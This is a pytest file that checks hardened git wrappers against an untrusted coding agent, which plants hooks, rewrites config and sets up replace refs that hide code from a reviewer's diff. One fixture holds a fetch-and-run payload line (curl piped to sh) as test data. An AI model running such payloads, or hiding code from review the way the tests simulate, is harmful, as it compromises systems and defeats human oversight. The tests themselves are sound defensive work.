"""gate-02 / gate-03 edge probes for the hardened git helpers in git_ops.

Complements ``test_git_hardening_gate_02_03.py`` with the cases it does not
cover: the other places an agent can plant a hook, blob-level replace refs
that hide code from the reviewer's patch diff, precedence of every ``-c`` pin
over agent-written config, operator program environment, async parity,
environment isolation and argv construction.

Every behavioural test builds a real temporary repository and plants the
attack with an UNHARDENED git (the "agent"), proves the attack is live with a
control run, then asserts the ``equipa.git_ops`` helpers are immune. No git
call is mocked.

Copyright 2026 Forgeborn
"""

from __future__ import annotations

import os
import subprocess
from collections.abc import Callable
from pathlib import Path

import pytest

from equipa.git_ops import (
    GIT_HARDENING_ARGS,
    GIT_HARDENING_ENV,
    _git_subcommand_index,
    _hardened_git_argv,
    git_run,
    git_run_async,
    merge_task_branch,
)
from equipa.role_resolver import _GIT_SAFE_CONFIG

_IDENTITY_ENV = {
    "GIT_AUTHOR_NAME": "Probe",
    "GIT_AUTHOR_EMAIL": "probe@example.invalid",
    "GIT_COMMITTER_NAME": "Probe",
    "GIT_COMMITTER_EMAIL": "probe@example.invalid",
}

# Variables that would change which program git runs or how config is read.
# Cleared so the operator's own shell cannot make a probe pass or fail.
_PROGRAM_ENV_VARS = (
    "GIT_SSH", "GIT_SSH_COMMAND", "GIT_ASKPASS", "SSH_ASKPASS",
    "GIT_EXTERNAL_DIFF", "GIT_EDITOR", "GIT_SEQUENCE_EDITOR", "GIT_PAGER",
    "GIT_NO_REPLACE_OBJECTS", "GIT_REPLACE_REF_BASE", "GIT_DIR",
    "GIT_WORK_TREE", "GIT_CONFIG_PARAMETERS", "GIT_CONFIG_COUNT",
)

_HOOK_NAMES = (
    "post-checkout",
    "post-merge",
    "pre-merge-commit",
    "pre-commit",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "post-index-change",
    "reference-transaction",
)

_UNREACHABLE_SSH_URL = "ssh://git.example.invalid/repo.git"


@pytest.fixture(autouse=True)
def _hermetic_git_env(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """Isolate every git call from the operator's global/system config."""
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "no-global-gitconfig"))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    for name in _PROGRAM_ENV_VARS:
        monkeypatch.delenv(name, raising=False)
    for name, value in _IDENTITY_ENV.items():
        monkeypatch.setenv(name, value)


def _git(repo: Path, *args: str, check: bool = True) -> str:
    """Plain, unhardened git: plays the agent and the control runs."""
    result = subprocess.run(
        ["git", *args], cwd=str(repo), capture_output=True, text=True,
        timeout=30, stdin=subprocess.DEVNULL, check=False,
    )
    if check and result.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {result.stderr}")
    return result.stdout.strip()


def _write_marker_script(path: Path, marker: Path, exit_code: int = 0) -> Path:
    """Executable shell script that records it ran by appending to ``marker``."""
    path.write_text(
        f'#!/bin/sh\necho "$0 $*" >> "{marker}"\nexit {exit_code}\n',
        encoding="utf-8",
    )
    path.chmod(0o755)
    return path


def _init_repo(repo: Path) -> None:
    repo.mkdir()
    _git(repo, "init", "-q", "-b", "main")
    (repo / "README.md").write_text("base\n", encoding="utf-8")
    _git(repo, "add", "README.md")
    _git(repo, "commit", "-q", "-m", "base")


def _commit_file(repo: Path, name: str, content: str, message: str) -> str:
    (repo / name).write_text(content, encoding="utf-8")
    _git(repo, "add", name)
    _git(repo, "commit", "-q", "-m", message)
    return _git(repo, "rev-parse", "HEAD")


@pytest.fixture
def plain_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    _init_repo(repo)
    return repo


# --- gate-03: every place an agent can plant a hook ----------------------------


def _hooks_in_default_dir(repo: Path, tmp_path: Path) -> Path:
    """No config at all: git's own ``$GIT_DIR/hooks`` directory."""
    return repo / ".git" / "hooks"


def _hooks_via_include_path(repo: Path, tmp_path: Path) -> Path:
    """core.hooksPath hidden in a file pulled in by ``include.path``."""
    hooks_dir = tmp_path / "included-hooks"
    hooks_dir.mkdir()
    include_file = tmp_path / "agent.inc"
    include_file.write_text(
        f"[core]\n\thooksPath = {hooks_dir}\n", encoding="utf-8",
    )
    _git(repo, "config", "include.path", str(include_file))
    return hooks_dir


def _hooks_via_worktree_config(repo: Path, tmp_path: Path) -> Path:
    """core.hooksPath in ``config.worktree``, read after the repo config."""
    hooks_dir = tmp_path / "worktree-hooks"
    hooks_dir.mkdir()
    _git(repo, "config", "extensions.worktreeConfig", "true")
    _git(repo, "config", "--worktree", "core.hooksPath", str(hooks_dir))
    return hooks_dir


_HOOK_PLANTERS: dict[str, Callable[[Path, Path], Path]] = {
    "default $GIT_DIR/hooks": _hooks_in_default_dir,
    "include.path file": _hooks_via_include_path,
    "config.worktree": _hooks_via_worktree_config,
}


@pytest.fixture(params=sorted(_HOOK_PLANTERS))
def planted_hooks_repo(request: pytest.FixtureRequest, tmp_path: Path) -> tuple[Path, Path]:
    """Repo with marker-writing hooks planted one way. Returns (repo, marker).

    Branch ``forge-task-5`` adds feature.py.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _git(repo, "checkout", "-q", "-b", "forge-task-5")
    _commit_file(repo, "feature.py", "VALUE = 5\n", "feature")
    _git(repo, "checkout", "-q", "main")

    marker = tmp_path / "hook-ran.log"
    hooks_dir = _HOOK_PLANTERS[request.param](repo, tmp_path)
    for hook in _HOOK_NAMES:
        _write_marker_script(hooks_dir / hook, marker)

    # Control: an unhardened checkout runs the agent's hooks.
    _git(repo, "checkout", "-q", "forge-task-5")
    _git(repo, "checkout", "-q", "main")
    assert marker.is_file(), f"control: {request.param} hooks should fire"
    marker.unlink()
    return repo, marker


def test_checkout_and_merge_run_no_hooks_wherever_planted(
    planted_hooks_repo: tuple[Path, Path],
) -> None:
    repo, marker = planted_hooks_repo
    for args in (["checkout", "-q", "forge-task-5"], ["checkout", "-q", "main"]):
        result = git_run(args, repo, timeout=30)
        assert result.returncode == 0, (args, result.stderr)

    merged = merge_task_branch(repo, 5, target_ref="main")

    assert merged.returncode == 0, merged.stderr
    assert (repo / "feature.py").is_file()
    assert not marker.exists(), marker.read_text(encoding="utf-8")


@pytest.mark.asyncio
async def test_async_checkout_runs_no_hooks_wherever_planted(
    planted_hooks_repo: tuple[Path, Path],
) -> None:
    repo, marker = planted_hooks_repo
    for args in (["checkout", "-q", "forge-task-5"], ["checkout", "-q", "main"]):
        result = await git_run_async(args, repo, timeout=30)
        assert result.returncode == 0, (args, result.stderr)
    assert not marker.exists(), marker.read_text(encoding="utf-8")


# --- gate-02: replace refs on blobs and commit messages -------------------------

_REAL_PAYLOAD = "import os\nos.system('curl https://x.invalid | sh')\n"
_DECOY_PAYLOAD = "print('hello')\n"


@pytest.fixture
def blob_replaced_repo(tmp_path: Path) -> Path:
    """Branch ``forge-task-3`` adds payload.py; a replace ref swaps its blob.

    The file NAME still shows up in a name-only diff, but a git honouring
    refs/replace shows the security reviewer harmless content instead of
    the code that will actually land.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _git(repo, "checkout", "-q", "-b", "forge-task-3")
    _commit_file(repo, "payload.py", _REAL_PAYLOAD, "add payload")
    real_blob = _git(repo, "rev-parse", "HEAD:payload.py")
    _git(repo, "checkout", "-q", "main")

    decoy_file = tmp_path / "decoy.py"
    decoy_file.write_text(_DECOY_PAYLOAD, encoding="utf-8")
    decoy_blob = _git(repo, "hash-object", "-w", str(decoy_file))
    _git(repo, "replace", real_blob, decoy_blob)

    # Control: an unhardened git shows the decoy content.
    control = _git(repo, "diff", "main...forge-task-3")
    assert "print('hello')" in control and "os.system" not in control
    return repo


def test_patch_diff_shows_real_content_despite_blob_replace(
    blob_replaced_repo: Path,
) -> None:
    result = git_run(["diff", "main...forge-task-3"], blob_replaced_repo, timeout=10)
    assert result.returncode == 0, result.stderr
    assert "+os.system('curl https://x.invalid | sh')" in result.stdout
    assert "print('hello')" not in result.stdout


@pytest.mark.asyncio
async def test_async_show_reads_real_blob_despite_blob_replace(
    blob_replaced_repo: Path,
) -> None:
    result = await git_run_async(
        ["show", "forge-task-3:payload.py"], blob_replaced_repo, timeout=10,
    )
    assert result.returncode == 0, result.stderr
    assert result.stdout == _REAL_PAYLOAD


def test_merge_writes_real_blob_to_disk_despite_blob_replace(
    blob_replaced_repo: Path,
) -> None:
    result = merge_task_branch(blob_replaced_repo, 3, target_ref="main")
    assert result.returncode == 0, result.stderr
    on_disk = (blob_replaced_repo / "payload.py").read_text(encoding="utf-8")
    assert on_disk == _REAL_PAYLOAD


def test_log_shows_real_commit_subject_despite_commit_replace(tmp_path: Path) -> None:
    """dispatch lists ``<default>..<branch>`` with ``log``; the subject must be real."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _git(repo, "checkout", "-q", "-b", "forge-task-4")
    code_sha = _commit_file(repo, "evil.py", "import os\n", "add backdoor")
    _git(repo, "checkout", "-q", "--detach", "main")
    decoy_sha = _commit_file(repo, "README.md", "base\ndocs\n", "fix typo in docs")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "replace", code_sha, decoy_sha)
    assert _git(repo, "log", "--format=%s", "main..forge-task-4") == "fix typo in docs"

    result = git_run(["log", "--format=%s", "main..forge-task-4"], repo, timeout=10)

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "add backdoor"


# --- every -c pin outranks agent-written repo AND worktree config ---------------

# (key, value the pin must win with). Agent values are set in both the repo
# config and config.worktree, which git reads after the repo config.
_PINNED_KEYS: tuple[tuple[str, str], ...] = (
    ("core.hooksPath", "/dev/null"),
    ("core.fsmonitor", ""),
    ("core.pager", "cat"),
    ("core.editor", ":"),
    ("sequence.editor", ":"),
    ("protocol.ext.allow", "never"),
    ("commit.gpgSign", "false"),
    ("tag.gpgSign", "false"),
    ("gpg.program", "gpg"),
    ("gpg.openpgp.program", "gpg"),
    ("gpg.x509.program", "gpgsm"),
    ("gpg.ssh.program", "ssh-keygen"),
    ("core.sshCommand", "ssh"),
    ("core.askPass", ""),
)

_BOOLEAN_KEYS = frozenset({"commit.gpgSign", "tag.gpgSign"})


@pytest.mark.parametrize(("key", "pinned_value"), _PINNED_KEYS)
def test_pin_outranks_agent_repo_and_worktree_config(
    plain_repo: Path, tmp_path: Path, key: str, pinned_value: str,
) -> None:
    if key in _BOOLEAN_KEYS:
        agent_value = "true"
    elif key == "protocol.ext.allow":
        agent_value = "always"
    else:
        agent_value = str(tmp_path / "agent-program")
    _git(plain_repo, "config", "extensions.worktreeConfig", "true")
    _git(plain_repo, "config", key, agent_value)
    _git(plain_repo, "config", "--worktree", key, agent_value)
    # Control: plain git resolves the agent's value.
    assert _git(plain_repo, "config", "--get", key) == agent_value

    result = git_run(["config", "--get", key], plain_repo, timeout=10)

    assert result.returncode == 0, result.stderr
    assert result.stdout.rstrip("\n") == pinned_value


def test_hardening_args_reuse_role_resolver_safe_config_and_hooks_pin_wins() -> None:
    """_GIT_SAFE_CONFIG is reused verbatim; the /dev/null hooks pin comes later."""
    args = list(GIT_HARDENING_ARGS)
    assert args[0] == "--no-pager"
    safe = list(_GIT_SAFE_CONFIG)
    starts = [i for i in range(len(args)) if args[i:i + len(safe)] == safe]
    assert starts, f"{safe} not found contiguously in {args}"
    assert args.index("core.hooksPath=/dev/null") > args.index("core.hooksPath=")
    for value in args[1:]:
        assert value == "-c" or "=" in value, value


# --- operator-controlled program environment ------------------------------------


def _plant_agent_ssh(repo: Path, tmp_path: Path) -> Path:
    agent_marker = tmp_path / "agent-ssh-ran.log"
    agent_script = _write_marker_script(tmp_path / "agent-ssh", agent_marker, 1)
    _git(repo, "config", "core.sshCommand", str(agent_script))
    return agent_marker


def test_operator_git_ssh_with_space_in_path_replaces_repo_ssh_command(
    plain_repo: Path, tmp_path: Path,
) -> None:
    """GIT_SSH passed by the caller is honoured (shell-quoted) over repo config."""
    agent_marker = _plant_agent_ssh(plain_repo, tmp_path)
    operator_dir = tmp_path / "operator bin"
    operator_dir.mkdir()
    operator_marker = tmp_path / "operator-ssh-ran.log"
    operator_ssh = _write_marker_script(operator_dir / "my ssh", operator_marker, 1)

    git_run(
        ["ls-remote", _UNREACHABLE_SSH_URL], plain_repo, timeout=30,
        env={"GIT_SSH": str(operator_ssh)},
    )

    assert operator_marker.is_file(), "operator GIT_SSH was dropped"
    assert not agent_marker.exists()


def test_operator_git_ssh_command_env_outranks_the_pin(
    plain_repo: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    agent_marker = _plant_agent_ssh(plain_repo, tmp_path)
    operator_marker = tmp_path / "operator-ssh-ran.log"
    operator_ssh = _write_marker_script(tmp_path / "operator-ssh", operator_marker, 1)
    monkeypatch.setenv("GIT_SSH_COMMAND", str(operator_ssh))

    git_run(["ls-remote", _UNREACHABLE_SSH_URL], plain_repo, timeout=30)

    assert operator_marker.is_file(), "operator GIT_SSH_COMMAND was dropped"
    assert not agent_marker.exists()


def test_operator_ssh_askpass_replaces_repo_core_askpass(
    plain_repo: Path, tmp_path: Path,
) -> None:
    _git(plain_repo, "config", "core.askPass", str(tmp_path / "agent-askpass"))

    result = git_run(
        ["config", "--get", "core.askPass"], plain_repo, timeout=10,
        env={"SSH_ASKPASS": "/opt/operator/askpass"},
    )

    assert result.stdout.rstrip("\n") == "/opt/operator/askpass"


# --- async parity for config-driven programs ------------------------------------


def _async_case_fsmonitor(repo: Path, script: Path) -> list[str]:
    _git(repo, "config", "core.fsmonitor", str(script))
    return ["status", "--porcelain"]


def _async_case_diff_external(repo: Path, script: Path) -> list[str]:
    _git(repo, "config", "diff.external", str(script))
    (repo / "README.md").write_text("base\nchanged\n", encoding="utf-8")
    return ["diff"]


def _async_case_show_textconv(repo: Path, script: Path) -> list[str]:
    (repo / ".gitattributes").write_text("*.md diff=agent\n", encoding="utf-8")
    _git(repo, "config", "diff.agent.textconv", str(script))
    return ["show", "HEAD"]


def _async_case_diff_behind_dash_c_dir(repo: Path, script: Path) -> list[str]:
    """A leading ``-C <dir>`` must not hide ``diff`` from the driver switch-off."""
    _git(repo, "config", "diff.external", str(script))
    (repo / "README.md").write_text("base\nchanged\n", encoding="utf-8")
    return ["-C", str(repo), "diff"]


_ASYNC_CASES = {
    "core.fsmonitor": _async_case_fsmonitor,
    "diff.external": _async_case_diff_external,
    "diff.<driver>.textconv via show": _async_case_show_textconv,
    "diff.external behind -C": _async_case_diff_behind_dash_c_dir,
}


@pytest.mark.asyncio
@pytest.mark.parametrize("case_name", sorted(_ASYNC_CASES))
async def test_async_repo_config_programs_never_run(
    plain_repo: Path, tmp_path: Path, case_name: str,
) -> None:
    marker = tmp_path / "agent-program-ran.log"
    script = _write_marker_script(tmp_path / "agent-program", marker, exit_code=1)
    args = _ASYNC_CASES[case_name](plain_repo, script)

    _git(plain_repo, *args, check=False)
    assert marker.is_file(), f"control: plain git should run {case_name}"
    marker.unlink()

    result = await git_run_async(args, plain_repo, timeout=30)

    assert not marker.exists(), marker.read_text(encoding="utf-8")
    assert result.returncode == 0, result.stderr


# --- environment isolation --------------------------------------------------------


def test_hardening_never_leaks_into_process_env_or_caller_dict(
    plain_repo: Path,
) -> None:
    caller_env = {"EQUIPA_PROBE_CALLER_ONLY": "1"}

    result = git_run(["status", "--porcelain"], plain_repo, timeout=10, env=caller_env)

    assert result.returncode == 0, result.stderr
    assert caller_env == {"EQUIPA_PROBE_CALLER_ONLY": "1"}
    assert "GIT_NO_REPLACE_OBJECTS" not in os.environ
    assert "EQUIPA_PROBE_CALLER_ONLY" not in os.environ


def test_hardening_env_is_read_only() -> None:
    with pytest.raises(TypeError):
        GIT_HARDENING_ENV["GIT_NO_REPLACE_OBJECTS"] = "0"  # type: ignore[index]
    # Task #3116 (MI-04): system config and system attributes are off too.
    # Task #3158 (FF-3155): and no lazy fetch from a promisor remote.
    assert dict(GIT_HARDENING_ENV) == {
        "GIT_NO_REPLACE_OBJECTS": "1",
        "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_ATTR_NOSYSTEM": "1",
        "GIT_NO_LAZY_FETCH": "1",
    }


def test_process_env_cannot_switch_replace_objects_back_on(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _git(repo, "checkout", "-q", "-b", "forge-task-6")
    code_sha = _commit_file(repo, "evil.py", "import os\n", "code")
    _git(repo, "checkout", "-q", "--detach", "main")
    decoy_sha = _commit_file(repo, "README.md", "base\ndocs\n", "docs")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "replace", code_sha, decoy_sha)
    monkeypatch.setenv("GIT_NO_REPLACE_OBJECTS", "0")
    monkeypatch.setenv("GIT_REPLACE_REF_BASE", "refs/replace/")

    result = git_run(["diff", "--name-only", "main...forge-task-6"], repo, timeout=10)

    assert result.stdout.split() == ["evil.py"]


@pytest.mark.asyncio
async def test_async_timeout_kills_git_and_reports_hardened_argv(
    plain_repo: Path, tmp_path: Path,
) -> None:
    """A hung transport raises TimeoutExpired whose cmd is the argv that ran."""
    hanging_ssh = tmp_path / "hanging-ssh"
    # stderr is detached so the orphaned sleep holds no pipe to the helper.
    hanging_ssh.write_text("#!/bin/sh\nexec sleep 3 2>/dev/null\n", encoding="utf-8")
    hanging_ssh.chmod(0o755)

    with pytest.raises(subprocess.TimeoutExpired) as excinfo:
        await git_run_async(
            ["ls-remote", _UNREACHABLE_SSH_URL], plain_repo, timeout=1,
            env={"GIT_SSH": str(hanging_ssh)},
        )

    cmd = list(excinfo.value.cmd)
    assert cmd[0] == "git"
    assert "core.hooksPath=/dev/null" in cmd
    assert cmd[-2:] == ["ls-remote", _UNREACHABLE_SSH_URL]


# --- argv construction --------------------------------------------------------------


@pytest.mark.parametrize(
    ("args", "expected"),
    [
        (["status"], 0),
        (["-C", "/repo", "diff"], 2),
        (["-c", "user.name=x", "-c", "user.email=y", "merge", "b"], 4),
        (["--no-pager", "show"], 1),
        (["--git-dir", "/g", "--work-tree", "/w", "log"], 4),
        (["--git-dir=/g", "diff"], 1),
        (["-c", "a.b=c"], None),
        ([], None),
    ],
)
def test_subcommand_index_skips_global_options(
    args: list[str], expected: int | None,
) -> None:
    assert _git_subcommand_index(args) == expected


def test_diff_driver_switch_off_lands_after_subcommand_and_before_pathspec() -> None:
    argv = _hardened_git_argv(
        ["-C", "/repo", "diff", "--name-only", "main", "--", "a.py"], {},
    )
    diff_at = argv.index("diff")
    assert argv[diff_at + 1:diff_at + 3] == ["--no-ext-diff", "--no-textconv"]
    assert argv.index("--no-textconv") < argv.index("--")
    assert argv[-4:] == ["--name-only", "main", "--", "a.py"]


@pytest.mark.parametrize("subcommand", ["status", "merge", "stash", "checkout", "rebase"])
def test_non_diff_subcommands_get_no_diff_flags(subcommand: str) -> None:
    argv = _hardened_git_argv([subcommand], {})
    assert "--no-ext-diff" not in argv
    assert "--no-textconv" not in argv
    assert argv[-1] == subcommand


def test_does_not_mutate_callers_argument_list() -> None:
    args = ["diff", "--name-only"]
    _hardened_git_argv(args, {})
    assert args == ["diff", "--name-only"]
